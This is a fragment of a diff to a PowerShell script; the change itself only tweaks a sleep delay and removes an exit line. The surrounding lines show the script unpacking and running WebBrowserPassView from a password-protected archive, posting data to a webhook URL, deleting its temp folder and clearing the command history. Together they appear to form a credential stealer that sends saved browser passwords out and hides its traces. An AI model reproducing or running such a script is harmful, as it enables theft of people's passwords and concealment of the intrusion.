@@ -11,7 +11,7 @@ Expand-Archive 7z.zip | Out-Null
 .\7z\7za.exe e wbpv.zip -pwbpv28821@ -y | Out-Null
 .\WebBrowserPassView.exe
 
-Sleep 10
+Sleep 4
 
 $wshell.AppActivate('WebBrowserPassView') | Out-Null
 Sleep 1
@@ -42,4 +42,3 @@ Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body | 
 cd ..
 rm -R \temp
 Clear-History
-exit
